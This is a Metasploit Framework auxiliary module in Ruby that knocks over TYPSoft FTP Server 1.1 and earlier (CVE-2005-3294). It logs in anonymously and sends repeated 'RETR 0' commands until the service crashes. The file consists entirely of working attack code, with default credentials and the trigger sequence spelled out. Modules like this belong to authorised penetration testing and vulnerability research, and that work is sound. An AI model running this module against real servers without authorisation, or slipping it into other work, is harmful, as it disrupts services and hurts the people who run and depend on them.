##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'TYPSoft FTP Server 1.1 RETR Denial of Service',
      'Description'    => %q{
        This module triggers Denial of Service in the TYPSoft FTP Server 1.1 and earlier by issuing multiple "RETR" command requests. 
      },
      'Author'         => [
          'Donnie Werner of exploitlabs',  # Bug Discoverer
          'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>'  # Metasploit Module
          ],	
      'License'        => MSF_LICENSE,
      'Version'        => '$Revision$',
      'References'     =>
        [
          [ 'CVE', '2005-3294'],
          [ 'BID', '15104'],
          [ 'OSVDB', '19992'],
          [ 'URL', 'http://www.exploit-db.com/exploits/1251/']
        ],
      'DisclosureDate' => 'Oct 13 2005'))

    # They're required
    register_options([
      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'mozilla@example.com' ])
    ])
  end

  def run
    return unless connect_login
    
    print_status("Sending DoS packets ...")
    
    3.times do |x|		
      print_status("# #{x+1}")
      raw_send("RETR 0\r\n")			
    end
      
    disconnect
    print_good("Done")
    
  end
end
